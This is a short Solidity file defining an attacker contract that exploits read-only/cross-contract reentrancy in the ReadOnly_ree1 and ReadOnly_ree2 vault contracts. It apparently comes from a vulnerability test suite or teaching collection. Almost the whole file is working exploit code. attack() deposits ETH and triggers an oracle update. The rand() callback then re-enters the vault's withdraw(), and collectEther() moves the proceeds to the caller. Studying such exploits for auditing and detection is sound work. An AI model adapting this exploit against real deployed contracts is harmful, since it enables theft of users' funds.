// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../cross-contract/read-only/ReadOnly_ree1.sol";

// THIS ATTACKER WORKS BOTH AGAINST ReadOnly_ree1 and ReadOnly_ree2

contract ReadOnly_ree1_Attacker is IPRNG {
    ReadOnly_ree1 public v;
    ReadOnly_ree1_Oracle public o;
    bool public performAttack;
    address private owner;

    constructor(address payable _v, address _o) {
        v = ReadOnly_ree1(_v);
        o = ReadOnly_ree1_Oracle(_o);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        v.deposit{value: msg.value}(address(this));
        performAttack = true;
        o.update(
            address(this),
            ((address(v).balance - msg.value) * o.randomness()) /
                0.01 ether -
                o.fix()
        );
    }

    function rand(uint256 amt) public returns (uint256) {
        if (performAttack) {
            performAttack = false;
            v.withdraw();
        }
        return amt * 0;
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
